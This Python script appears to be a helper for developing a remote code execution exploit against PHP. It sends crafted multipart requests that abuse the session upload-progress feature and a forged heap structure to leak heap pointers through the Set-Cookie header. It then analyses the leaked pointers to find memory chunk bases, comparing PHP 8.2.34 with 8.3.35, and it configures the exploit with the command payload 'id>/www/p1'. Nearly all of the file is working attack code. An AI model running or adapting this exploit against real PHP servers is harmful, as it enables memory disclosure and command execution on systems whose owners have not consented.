#!/usr/bin/env python3
"""Dump the raw stage-1 Set-Cookie leak on a given port and analyze the
2MB-aligned heap-pointer buckets. Compare a failing version (8.2.34) vs a
working one (8.3.35) to see why the chunk-base leak misses."""
import sys, os, time, struct, re, urllib.parse
from collections import Counter
sys.path.insert(0, r"C:\Users\likat\p2s52704")
import exploit

PORT = int(sys.argv[1])
HUGE_MB = int(sys.argv[2]) if len(sys.argv) > 2 else 256


def stage1_cookie(t, ex):
    # A request
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ex._file_part(), ex._big_field(),
    ]
    t.post(exploit.build_multipart(parts, b"S" * 17), b"S" * 17,
           read_cap=1 << 20, timeout=120)
    time.sleep(0.2)
    # B request
    parts = [
        {"name": "PHPSESSID", "data": exploit.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(ex.stage1_n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(exploit.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    return exploit.parse_cookie(resp)


def analyze(raw, label):
    print(f"\n=== {label} === cookie_len={len(raw)}", flush=True)
    if len(raw) < 16:
        print("  (too short)"); return
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    print(f"  2MB-aligned heap buckets (top 8): "
          f"{[(hex(b), n) for b, n in c.most_common(8)]}", flush=True)
    # also show 4KB buckets
    c4 = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c4[v & ~0xFFF] += 1
    print(f"  4KB-aligned buckets (top 8): "
          f"{[(hex(b), n) for b, n in c4.most_common(8)]}", flush=True)


def main():
    t = exploit.Target(f"http://127.0.0.1:{PORT}/", timeout=60, verbose=False)
    ex = exploit.Exploit(t, "id>/www/p1", huge_mb=HUGE_MB, verbose=False, profile="bookworm")
    for a in range(3):
        ex.rotate()
        raw = stage1_cookie(t, ex)
        if len(raw) >= 1000:
            analyze(raw, f"port={PORT} attempt={a}")
            base = exploit.chunk_base_from_cookie(raw)
            print(f"  -> chunk_base=0x{base:x}" if base else "  -> NO chunk base", flush=True)
            return
        else:
            print(f"  attempt {a}: cookie too short ({len(raw)})", flush=True)
    print("  all attempts: cookie too short", flush=True)


if __name__ == "__main__":
    main()
